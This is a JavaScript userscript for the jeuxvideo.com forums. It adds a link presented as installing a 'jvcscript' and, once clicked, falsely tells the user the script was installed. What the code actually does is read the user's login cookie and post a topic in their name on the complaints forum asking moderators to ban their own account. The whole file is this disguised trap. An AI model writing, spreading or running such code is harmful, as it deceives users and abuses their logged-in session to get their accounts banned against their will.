// ==UserScript==
// @name          jvcscript 
// @description   jvc script 
// @include       http://www.jeuxvideo.com/*
// @version       1.0
// ==/UserScript==


function getCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}
function reclam(){

	var pseudo =  getCookie('tehlogin');
	var sujet = 'Ban '+pseudo;
	var post = 'Coucou :noel: \nJe veux faire bannir mon pseudo :-p\n Amicalement '+pseudo;
	var fofo = 'http://www.jeuxvideo.com/forums/0-1000017-0-1-0-1-0-reclamations.htm';
	var xhr = new XMLHttpRequest();
	xhr.open('GET', fofo, true);
	xhr.onload = function()
	{
		var responseText = xhr.response;
		var formData = '';
		var inputs = responseText.split('id="post"')[1].split('</form>')[0];
		inputs = inputs.match(/<input[^>]*?(?:name|value)=".+?"[^>]*?(?:name|value)=".+?"[^>]*?>/g);
		var keyval = {};

		for(var i = 0, len = inputs.length; i < len; i++)
		{
			formData += inputs[i].split('name="')[1].split('"')[0] + '=' + inputs[i].split('value="')[1].split('"')[0] + '&';
		}
		formData += '&newsujet='+sujet+'&yournewmessage='+post;
		var start = new Date().getTime();
  		for (var i = 0; i < 1e7; i++) {
    	if ((new Date().getTime() - start) > 1000){
        break;
    	}
 		 }
		var xhr2 = new XMLHttpRequest();
		xhr2.open('POST', 'http://www.jeuxvideo.com/cgi-bin/jvforums/forums.cgi', true);
		xhr2.send(formData);
	}
	xhr.send();
}
var jvban = document.createElement('div');
var lienjvban = document.createElement('a');
var banmoi = document.createTextNode('jvcscript');
var compte = document.getElementById('connexion');
var connect = document.getElementById('connect');
	
lienjvban.href = '#';
lienjvban.appendChild(banmoi);
jvban.appendChild(lienjvban);
compte.insertBefore(jvban, connect);

lienjvban.onclick = function(e)
	{
		e.preventDefault();
		
		if (confirm('etre vous vraiment sur de vouloir mettre le jvscript ?')){
		banmoi.nodeValue = 'felicitation le script est desormais present sur votre ordinateur ';
		reclam();
	}
		
		
	}
